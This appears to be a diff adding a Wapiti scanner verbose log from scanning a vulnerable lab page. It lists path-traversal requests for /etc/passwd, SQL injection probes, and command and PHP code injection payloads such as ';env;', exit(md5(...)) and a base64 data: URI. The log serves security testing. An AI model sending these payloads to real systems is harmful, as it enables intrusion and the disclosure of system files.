+2024-03-20 16:36:02.627 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:02.636 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.643 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:36:02.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:36:02.657 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=commandi_blind.php
+2024-03-20 16:36:02.684 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=commandi_blind.php%00
+2024-03-20 16:36:02.694 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=commandi_blind.php%3A%3A%24DATA
+2024-03-20 16:36:02.727 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 16:36:02.798 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:36:02.809 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:36:02.822 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 16:36:02.832 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:36:02.859 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:36:02.859 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%C2%BF%27%22%28&form=submit
+2024-03-20 16:36:02.876 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=fuzz%C2%BF%27%22%28
+2024-03-20 16:36:02.930 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%20AND%2087%3D121%20AND%2070%3D70&form=submit
+2024-03-20 16:36:02.963 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%27%20AND%2049%3D100%20AND%20%2736%27%3D%2736&form=submit
+2024-03-20 16:36:02.997 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%22%20AND%2037%3D88%20AND%20%2248%22%3D%2248&form=submit
+2024-03-20 16:36:03.031 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%29%20AND%2077%3D87%20AND%20%2896%3D96&form=submit
+2024-03-20 16:36:03.064 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%27%29%20AND%2019%3D80%20AND%20%28%2795%27%3D%2795&form=submit
+2024-03-20 16:36:03.095 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%22%29%20AND%2070%3D111%20AND%20%28%2297%22%3D%2297&form=submit
+2024-03-20 16:36:03.130 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%20AND%2036%3D84%20AND%2063%3D63
+2024-03-20 16:36:03.169 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%27%20AND%2055%3D111%20AND%20%2762%27%3D%2762
+2024-03-20 16:36:03.211 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%22%20AND%2071%3D162%20AND%20%2264%22%3D%2264
+2024-03-20 16:36:03.257 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%29%20AND%2093%3D175%20AND%20%2855%3D55
+2024-03-20 16:36:03.307 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%27%29%20AND%2022%3D56%20AND%20%28%2731%27%3D%2731
+2024-03-20 16:36:03.356 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%22%29%20AND%2057%3D75%20AND%20%28%2245%22%3D%2245
+2024-03-20 16:36:03.406 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10
+2024-03-20 16:36:03.406 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%C2%BF%27%22%28&bug=10
+2024-03-20 16:36:03.413 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=%C2%BF%27%22%28
+2024-03-20 16:36:03.426 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%20AND%2014%3D87%20AND%2017%3D17&bug=10
+2024-03-20 16:36:03.433 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%27%20AND%2035%3D96%20AND%20%2740%27%3D%2740&bug=10
+2024-03-20 16:36:03.441 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%22%20AND%2033%3D84%20AND%20%2274%22%3D%2274&bug=10
+2024-03-20 16:36:03.452 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%29%20AND%2074%3D97%20AND%20%2839%3D39&bug=10
+2024-03-20 16:36:03.462 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%27%29%20AND%2028%3D62%20AND%20%28%2781%27%3D%2781&bug=10
+2024-03-20 16:36:03.474 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%22%29%20AND%2058%3D141%20AND%20%28%2296%22%3D%2296&bug=10
+2024-03-20 16:36:03.486 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%20AND%2096%3D149%20AND%2018%3D18
+2024-03-20 16:36:03.496 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%20AND%2082%3D113%20AND%2011%3D11
+2024-03-20 16:36:03.508 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%20AND%2083%3D83%20AND%2064%3D64
+2024-03-20 16:36:03.523 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%20AND%2035%3D121%20AND%20%2777%27%3D%2777
+2024-03-20 16:36:03.533 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%20AND%2023%3D100%20AND%20%2783%27%3D%2783
+2024-03-20 16:36:03.541 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%20AND%2027%3D27%20AND%20%2756%27%3D%2756
+2024-03-20 16:36:03.550 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%20AND%2056%3D73%20AND%20%2253%22%3D%2253
+2024-03-20 16:36:03.558 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%20AND%2011%3D96%20AND%20%2259%22%3D%2259
+2024-03-20 16:36:03.568 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%20AND%2068%3D68%20AND%20%2265%22%3D%2265
+2024-03-20 16:36:03.578 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%29%20AND%2058%3D96%20AND%20%2817%3D17
+2024-03-20 16:36:03.588 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%29%20AND%2072%3D121%20AND%20%2880%3D80
+2024-03-20 16:36:03.597 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%29%20AND%2094%3D94%20AND%20%2814%3D14
+2024-03-20 16:36:03.607 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%29%20AND%2045%3D84%20AND%20%28%2794%27%3D%2794
+2024-03-20 16:36:03.617 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%29%20AND%2021%3D59%20AND%20%28%2733%27%3D%2733
+2024-03-20 16:36:03.627 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%27%29%20AND%2098%3D98%20AND%20%28%2749%27%3D%2749
+2024-03-20 16:36:03.636 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%29%20AND%2084%3D115%20AND%20%28%2242%22%3D%2242
+2024-03-20 16:36:03.645 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%29%20AND%2053%3D106%20AND%20%28%2235%22%3D%2235
+2024-03-20 16:36:03.655 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10%22%29%20AND%2083%3D83%20AND%20%28%2231%22%3D%2231
+2024-03-20 16:36:03.674 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit
+2024-03-20 16:36:03.674 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%C2%BF%27%22%28
+2024-03-20 16:36:03.708 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%20AND%2042%3D64%20AND%2084%3D84&form=submit
+2024-03-20 16:36:03.750 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%20AND%2073%3D93%20AND%2040%3D40&form=submit
+2024-03-20 16:36:03.791 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%20AND%2076%3D76%20AND%2034%3D34&form=submit
+2024-03-20 16:36:03.824 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%20AND%2048%3D119%20AND%20%2762%27%3D%2762&form=submit
+2024-03-20 16:36:03.859 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%20AND%2037%3D92%20AND%20%2786%27%3D%2786&form=submit
+2024-03-20 16:36:03.895 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%20AND%2092%3D92%20AND%20%2774%27%3D%2774&form=submit
+2024-03-20 16:36:03.929 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%20AND%2042%3D130%20AND%20%2254%22%3D%2254&form=submit
+2024-03-20 16:36:04.031 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%20AND%2029%3D86%20AND%20%2218%22%3D%2218&form=submit
+2024-03-20 16:36:04.065 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%20AND%2028%3D28%20AND%20%2294%22%3D%2294&form=submit
+2024-03-20 16:36:04.099 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%29%20AND%2045%3D105%20AND%20%2855%3D55&form=submit
+2024-03-20 16:36:04.131 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%29%20AND%2044%3D112%20AND%20%2879%3D79&form=submit
+2024-03-20 16:36:04.163 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%29%20AND%2068%3D68%20AND%20%2896%3D96&form=submit
+2024-03-20 16:36:04.199 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%29%20AND%2021%3D82%20AND%20%28%2727%27%3D%2727&form=submit
+2024-03-20 16:36:04.232 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%29%20AND%2052%3D102%20AND%20%28%2714%27%3D%2714&form=submit
+2024-03-20 16:36:04.266 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%27%29%20AND%2055%3D55%20AND%20%28%2791%27%3D%2791&form=submit
+2024-03-20 16:36:04.299 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%29%20AND%2032%3D109%20AND%20%28%2226%22%3D%2226&form=submit
+2024-03-20 16:36:04.331 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%29%20AND%2025%3D51%20AND%20%28%2277%22%3D%2277&form=submit
+2024-03-20 16:36:04.369 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=%22%29%20AND%2020%3D20%20AND%20%28%2285%22%3D%2285&form=submit
+2024-03-20 16:36:04.407 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%20AND%2095%3D140%20AND%2059%3D59
+2024-03-20 16:36:04.437 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%27%20AND%2011%3D38%20AND%20%2732%27%3D%2732
+2024-03-20 16:36:04.467 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%22%20AND%2070%3D81%20AND%20%2226%22%3D%2226
+2024-03-20 16:36:04.497 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%29%20AND%2072%3D151%20AND%20%2872%3D72
+2024-03-20 16:36:04.529 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%27%29%20AND%2086%3D114%20AND%20%28%2765%27%3D%2765
+2024-03-20 16:36:04.587 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: target=&form=submit%22%29%20AND%2051%3D79%20AND%20%28%2254%22%3D%2254
+2024-03-20 16:36:04.622 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:36:04.622 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
+2024-03-20 16:36:04.629 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
+2024-03-20 16:36:04.643 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%20AND%2038%3D80%20AND%2039%3D39&security_level=2
+2024-03-20 16:36:04.651 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%27%20AND%2057%3D153%20AND%20%2764%27%3D%2764&security_level=2
+2024-03-20 16:36:04.658 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%22%20AND%2032%3D122%20AND%20%2238%22%3D%2238&security_level=2
+2024-03-20 16:36:04.666 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%29%20AND%2012%3D69%20AND%20%2841%3D41&security_level=2
+2024-03-20 16:36:04.673 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%27%29%20AND%2081%3D117%20AND%20%28%2720%27%3D%2720&security_level=2
+2024-03-20 16:36:04.680 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%22%29%20AND%2038%3D137%20AND%20%28%2299%22%3D%2299&security_level=2
+2024-03-20 16:36:04.689 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%20AND%2069%3D133%20AND%2016%3D16
+2024-03-20 16:36:04.695 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%27%20AND%2082%3D138%20AND%20%2738%27%3D%2738
+2024-03-20 16:36:04.704 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%22%20AND%2028%3D117%20AND%20%2220%22%3D%2220
+2024-03-20 16:36:04.710 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%29%20AND%2034%3D87%20AND%20%2893%3D93
+2024-03-20 16:36:04.719 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%27%29%20AND%2053%3D70%20AND%20%28%2745%27%3D%2745
+2024-03-20 16:36:04.729 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%22%29%20AND%2050%3D102%20AND%20%28%2248%22%3D%2248
+2024-03-20 16:36:04.763 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 16:36:04.778 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:36:04.778 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 16:36:04.778 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 16:36:04.807 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 16:36:04.839 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : security_level
+2024-03-20 16:36:04.840 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : security_level
+2024-03-20 16:36:04.867 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : security_level
+2024-03-20 16:36:04.941 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:36:04.953 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/commandi_blind.php (1)
+2024-03-20 16:36:04.963 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit
+2024-03-20 16:36:04.964 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%3Benv%3B&form=submit
+2024-03-20 16:36:04.979 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%7Cenv%7C&form=submit
+2024-03-20 16:36:04.991 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%3Benv%3B&form=submit
+2024-03-20 16:36:05.015 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%3Benv%3B&form=submit
+2024-03-20 16:36:05.037 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&form=submit
+2024-03-20 16:36:05.050 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%3Benv%3B&form=submit
+2024-03-20 16:36:05.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz%0Aenv%3B&form=submit
+2024-03-20 16:36:05.106 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%26set%26&form=submit
+2024-03-20 16:36:05.121 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=set&form=submit
+2024-03-20 16:36:05.146 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=env&form=submit
+2024-03-20 16:36:05.166 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%2Fe%00&form=submit
+2024-03-20 16:36:05.184 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.197 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.213 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.229 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.244 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.260 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.274 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.287 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.303 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.316 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.330 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit
+2024-03-20 16:36:05.344 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit
+2024-03-20 16:36:05.359 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=submit
